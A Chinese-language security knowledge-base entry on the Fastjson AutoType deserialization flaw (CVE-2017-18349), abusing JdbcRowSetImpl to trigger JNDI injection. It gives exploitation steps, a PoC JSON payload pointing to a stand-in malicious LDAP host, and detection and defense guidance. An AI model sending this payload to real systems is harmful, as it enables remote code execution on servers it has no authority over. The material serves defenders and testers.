---
id: web-java-deser-fastjson-jdbc-rowset
title: Fastjson JdbcRowSetImpl 触发 JNDI 注入
type: scenario
domain: web
path: web/java/deserialization/fastjson
technique: fastjson-autotype
aliases: [fastjson JdbcRowSetImpl, fastjson JNDI]
tags: [java, fastjson, deserialization, jndi, autotype]
cve: [CVE-2017-18349]
severity: critical
confidence: high
status: draft
created: 2026-11-04
updated: 2026-11-04
---

## 一句话结论

在 Fastjson 允许 AutoType 的版本中，`JdbcRowSetImpl` 的 `dataSourceName` 可控会把 `connect` 引向 JNDI，从而加载远程对象并执行代码。

## 原理

Fastjson 解析 `@type` 时会实例化目标类并调用 setter。`JdbcRowSetImpl.setDataSourceName` 只保存字符串，但后续 `getConnection`/`connect` 会用该名称做 JNDI lookup。攻击者把 `dataSourceName` 指向恶意 LDAP/RMI 服务即可触发远程类加载。

## 触发条件

- Fastjson 版本受 AutoType 影响，或目标显式开启 AutoType；
- 出网可达攻击者控制的 LDAP/RMI 服务；
- 目标 JDK 未完全限制远程 codebase（高版本需绕过）。

## 利用步骤

1. 确认 Fastjson 版本与 AutoType 状态；
2. 启动恶意 LDAP/RMI 服务，准备可执行 payload；
3. 构造 `@type` 为 `com.sun.rowset.JdbcRowSetImpl` 的 JSON，设置 `dataSourceName`；
4. 发送请求，观察 JNDI 回连与命令执行。

## PoC

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

## 变体与关联

- 变体：`TemplatesImpl`、`BadAttributeValueExpException` 等；
- 关联：JNDI 高版本绕过、Fastjson 缓存与 `ExpectClass` 绕过。

## 检测与防御

- 检测：请求体中的 `@type`、`JdbcRowSetImpl`、`ldap://`/`rmi://`；
- 防御：升级 Fastjson、关闭 AutoType、JEP 290 过滤、限制出网。
